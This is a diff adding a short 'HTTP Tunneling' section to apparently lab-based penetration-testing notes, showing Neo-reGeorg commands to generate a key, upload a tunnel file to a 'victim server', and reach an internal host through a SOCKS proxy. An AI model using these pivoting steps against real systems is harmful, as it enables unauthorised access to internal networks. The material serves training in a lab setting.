@@ -52,7 +52,31 @@ When dealing with a certain challenge, you have to come up with a plan to come u
 
 ### HTTP(S)
 
+#### HTTP Tunneling
 
+Encapsulates other protocols and sends them back and forth via the HTTP protocol. Create an HTTP tunnel communication channel to pivot into the internal network and communicate with local network devices through HTTP protocol.
+
+Use a [Neo-reGeorg tool](https://github.com/L-codes/Neo-reGeorg) to establish a communication channel to access the internal network devices.
+
+Generate a Neo-ReGeorg key
+
+```console
+python3 neoreg.py generate -k thm
+```
+
+Upload tunnel file to the victim server.
+
+Create the tunnel
+
+```console
+python3 neoreg.py -k thm -u http://10.10.230.138/uploader/files/tunnel.php
+```
+
+Connect to a machine behind the webserver through the tunnel.
+
+```console
+curl --socks5 127.0.0.1:1080 http://172.20.0.120:80/flag
+```
 
 ### ICMP
 
